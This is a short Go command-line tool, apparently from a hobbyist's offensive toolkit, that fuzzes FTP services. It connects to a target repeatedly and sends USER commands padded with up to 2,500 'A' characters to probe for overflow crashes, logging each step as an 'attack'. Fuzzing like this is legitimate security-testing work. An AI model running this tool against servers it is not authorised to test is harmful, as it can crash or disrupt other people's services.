/*

Developer => ArkANgeL43
Type      => CLI
Package   => Main
File      => FTP.go

Does:
	Fuzzes FTP services

Output:
	---------------------------
- Attacking [ 127.0.0.1 ] - On Port   [ 21 ] 127.0.0.1:21
 [ CONN ] CONNECTION MADE ->  &{{0xc0001b6080}}
 [ CONN ] USER Fuzz complete ->  USER %s

 [ CONN ] PASS Fuzz complete ->  PASS password

Flags:
	-address | specify IP address
	-port    | Speify FTP port

*/
package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
)

var (
	method_1 = "tcp"
	addr     = flag.String("address", "", "")
	port     = flag.String("port", "", "")
)

func err_c(err error, exit_code int, msg string, offset int) {
	if err != nil {
		if offset == 0 {
			fmt.Println("\033[31m [ WARNING ] ERROR: FATAL: => ", msg, err)
			os.Exit(exit_code)
		} else {
			log.Fatalf("\033[31m[ ! ] ERROR: WARNING: FATAL: Error at offset %d => %s\n", offset, err)

		}
	}
}

func attack(method_dial, ip, port string) {
	ip_main := ip + ":" + port
	fmt.Println(ip_main)
	for i := 0; i < 2500; i++ {
		conntect, con_err := net.Dial(method_dial, ip_main)
		err_c(con_err, 1, "", i)
		fmt.Println("\033[31m [ CONN ] CONNECTION MADE -> ", conntect)
		bufio.NewReader(conntect).ReadString('\n')
		user_main := ""
		for n := 0; n <= i; n++ {
			user_main += "A"
		}
		raw_user := "USER %s\n"
		fmt.Fprintf(conntect, raw_user, user_main)
		fmt.Println("\033[35m [ CONN ] USER Fuzz complete -> ", raw_user)
		bufio.NewReader(conntect).ReadString('\n')
		rpw_pass := "PASS password\n"
		fmt.Fprint(conntect, rpw_pass)
		fmt.Println("\033[35m [ CONN ] PASS Fuzz complete -> ", rpw_pass)
		bufio.NewReader(conntect).ReadString('\n')
		if err := conntect.Close(); err != nil {
			log.Println("[!] Unable to close connection. Is service alive?")
		}
	}
}

func main() {
	flag.Parse()
	if *port == "" {
		attack(method_1, *addr, "21")
	} else {
		if *addr == "" {
			panic("FIELD `Addr` OR `ADDRESS` of FTP attak method was not filled, please input a IP address as a target")
		} else {
			fmt.Println("---------------------------")
			fmt.Printf("- Attacking [ %s ] ", *addr)
			fmt.Printf("- On Port   [ %s ] ", *port)
			attack(method_1, *addr, *port)
		}
	}
}
